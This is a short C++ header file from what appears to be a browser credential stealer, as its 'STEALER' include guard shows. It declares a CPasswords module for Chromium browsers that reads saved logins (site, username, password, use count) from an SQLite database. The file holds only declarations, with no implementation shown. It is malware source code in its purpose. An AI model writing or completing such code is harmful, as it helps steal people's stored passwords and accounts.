//
// Created by .1qxz on 08.06.2024.
//

#ifndef STEALER_CPASSWORDS_H
#define STEALER_CPASSWORDS_H


#include "../ChromiumBrowserModule.h"
#include "sqlite3.h"

struct Password
{
    std::string origin;
    std::string username;
    std::string password;
    int times_used;
};

class CPasswords : public ChromiumBrowserModule {
public:
    void execute(const fs::path &root, const std::string &name, const fs::path &path) override;
private:
    std::list<Password> getPasswords(const fs::path& db_path);
};


#endif //STEALER_CPASSWORDS_H
